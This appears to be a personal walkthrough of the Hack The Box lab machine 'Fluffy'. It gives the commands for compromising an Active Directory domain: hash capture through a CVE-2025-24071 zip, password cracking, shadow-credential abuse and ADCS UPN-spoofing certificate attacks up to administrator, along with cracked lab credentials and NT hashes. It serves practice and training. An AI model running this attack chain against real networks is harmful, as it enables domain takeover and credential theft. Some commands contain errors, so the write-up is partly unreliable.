---
title: Fluffy
draft: false
tags: 
passwordHash: e710e15d65f43d007f7b7290b990241034f1044e3cb1db3a8777b206c46bc4b8
---
![[../../../assets/Fluffy.png]]

Machine Link: https://app.hackthebox.com/machines/Fluffy

---

# Enumeration (j.fleischman)
## Port scanning
- Checking open ports and the running services
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.69 -oG allPorts
nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -n -Pn --min-rate 5000 10.10.11.69 -oN Targeted
```
>[!example]- View
>![[../../../assets/Pasted image 20250526203439.png]]

Domain: `fluffy.htb`
DC: `DC01.fluffy.htb`

## SMB
- Using the given user we can enumerate SMB shares, and we found this folder
```bash
impacket-smbclient fluffy.htb/'j.fleischman':'J0elTHEM4n1990!'@10.10.11.69

use IT

get *
```
>[!example]- View
>![[../../../assets/Pasted image 20250527091714.png]]
>![[../../../assets/Pasted image 20250527091753.png]]

# Exploitation (j.fleischman ⇨ p.agila)
## CVE-2025-24071
- There are some interesting files and if we unzip it we see a interesting extension
>[!example]- View
>![[../../../assets/Pasted image 20250527092100.png]]

- Maybe if we upload a malicius `.zip` file we can get the NetNTLMv2 hash, we can use this [PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC) in order to make the file
```bash
git clone https://github.com/Marcejr117/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC
python3 PoC.py Mytest 10.10.16.2
```
>[!example]- View
>![[../../../assets/Pasted image 20250527092552.png]]

- now we start [[../../../Tools/Responder|Responder]] and send the payload `.zip` using [[../../../Tools/smbclient|smbclient]]
```bash
sudo python3 ./Responder.py -I tun0

put exploit.zip
```
>[!example]- View
>![[../../../assets/Pasted image 20250527093551.png]]

## Cracking
- We have a hash so lets crack it using [[../../../Tools/hashcat|hashcat]]
```bash
hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
```
>[!example]- View
>![[../../../assets/Pasted image 20250527094910.png]]

Creds: `p.agila:prometheusx-303`

# Enumeration (p.agila)
## BloodHound
- Lets see the gerarqui of the AD enviroment so firts run [[../../../Tools/ntpdate|ntpdate]], [[../../../Tools/bloodhaund-python|bloodhaund-python]] and then import `.zip` to [[../../../Tools/BloodHound|BloodHound]], 
```bash
sudo ntpdate -u 10.10.11.69

bloodhound-python -u 'p.agila' -p 'prometheusx-303' -c ALL -v --zip -d FLUFFY.HTB -dc DC01.FLUFFY.HTB -ns 10.10.11.69
```
>[!example]- View
>![[../../../assets/Pasted image 20250527095422.png]]
>![[../../../assets/Pasted image 20250527104913.png]]

# Exploitation (GenericAll)
- `p.agila` is member of `SERVICE ACCOUNT MANAGERS` that have "GenericAll" priv over `SERVICE ACCOUNTS` so we can add it to this gruop
```bash
net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

- we can check it,  running this command
```bash
net rpc group members "Service Accounts" -U "FLUFFY.HBT"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"

or 

net rpc user info "p.agila" -U "FLUFFY.HBT/p.agila%prometheusx-303" -S DC01.FLUFFY.HTB

```
>[!example]- View
>![[../../../assets/Pasted image 20250527105444.png]]
>![[../../../assets/Pasted image 20250527112524.png]]


# Exploitation (GenericWrite to WINRM_SVC)
- Using [[../../../Tools/pywhisker.py|pywhisker.py]]
```bash
python3 pywhisker/pywhisker.py -d FLUFFY.HTB -u p.agila -p 'prometheusx-303' --target "WINRM_SVC" --action "add" --dc-ip 10.10.11.69 --filename CACert --export PEM
```

- Getting the TGT
```bash
python3 PKINITtools/gettgtpkinit.py -dc-ip 10.10.11.69 -cert-pem CACert_cert.pem -key-pem CACert_priv.pem FLUFFY.HTB/WINRM_SVC winrm_SRV_Bueno.ccache
```
>[!example]- View
>![[../../../assets/Pasted image 20250527160147.png]]

- nos conectamos
```bash
KRB5CCNAME=winrm_SRV_Bueno.ccache evil-winrm -i DC01.FLUFFY.HTB -u WINRM_SVC -r FLUFFY.HTB -c CACert_cert.pem -k CACert_priv.pem
```

- also we can get the NTLM hash
```bash
python3 PKINITtools/getnthash.py FLUFFY.HTB/WINRM_SVC -key 62c40e2dd846dc69875827e337682d4c6f664292c602212d966d071360a896bf
```
>[!example]- View
>![[../../../assets/Pasted image 20250527160248.png]]

Hash NTLM= `33bd09dcd697600edf6b3a7af4875767`

# Getting Access (WINRM_SVC)
- using [[../../../Tools/evil-winrm|evil-winrm]]
```bash
export KRB5CCNAME=winrm_SRV_Bueno.ccache evil-winrm -i DC01.FLUFFY.HTB -u WINRM_SVC -r FLUFFY.HTB -c CACert_cert.pem -k CACert_priv.pem
```
>[!example]- View
>![[../../../assets/Pasted image 20250527163528.png]]

# Exploitation (GenericWrite to CA_SVC)
- As i cant perform DCSync attack i have to find and other way, like get control of `ca_svc`, like in the las step, but this time lets do it using [[../../../Tools/certipy-ad|certipy-ad]] / [[../../../Tools/certipy|certipy]] (just to practice, instead of [[../../../Tools/pywhisker.py|pywhisker.py]] and [[../../../Tools/gettgtpkinit.py|gettgtpkinit.py]]), first we explote GenericAll to add `p.agila` to `Service Accounts`
```bash
net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

- now we have permission to perform shadow credential attack (Use GenericWrite permision in order to modifies the KeyCredentials of the account), also known as ESC8
```bash
certipy shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc
```
>[!example]- View
>![[../../../assets/Pasted image 20250527193050.png]]

NT Hash: `ca0f4f9e9eb8a092addf53bb03fc98c8`

# Privilege escalation
>[!warning] you can preform this method using certify version < 5.x.x but if you want to know who i found this way, you will need to update the version >5 and then use this command
>- Reading attributes 
>```bash
>certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.XX.XX -user 'ca_svc' read
>```
>Looking for vulnerabilities
>```bash
>certipy find -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -stdout -vulnerable
>```

- ESC16 (Abusing UPN Spoofing and ESC1) , because we can change the "UserPrincipalName" of `ca_svc@fluffy.htb` to `administrator` this is posible because the ADCS is bad configured and allow ESC1 attack so we can request for a certify with a UPN of the administrator
```bash
certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
```
>[!example]- View
>![[../../../assets/Pasted image 20250527200831.png]]

- Now we just need to request the certify with UPN spoofed (I had to execute it a couple of times)
>[!quote]- Getting PKI and CN of ADCS
>```bash
>netexec ldap fluffy.htb -u p.agila -p prometheusx-303 -M adcs
>```
>![[../../../assets/Pasted image 20250529110250.png]]

```bash
certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```
>[!example]- View
>![[../../../assets/Pasted image 20250527201122.png]]

- Perfect now we have to restore the old value of UPN, and then perform an authentication like administrator
```bash
certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69
```
>[!example]- View
>![[../../../assets/Pasted image 20250527201155.png]]

# Getting access (Administrator)
- Using [[../../../Tools/evil-winrm|evil-winrm]] and the NT hash we can access as administrator
```bash
evil-winrm -i DC01.FLUFFY.HTB -u administrator -H "8da83a3fa618b6e3a00e93f676c92a6e"
```
>[!example]- View
>![[../../../assets/Pasted image 20250527201321.png]]
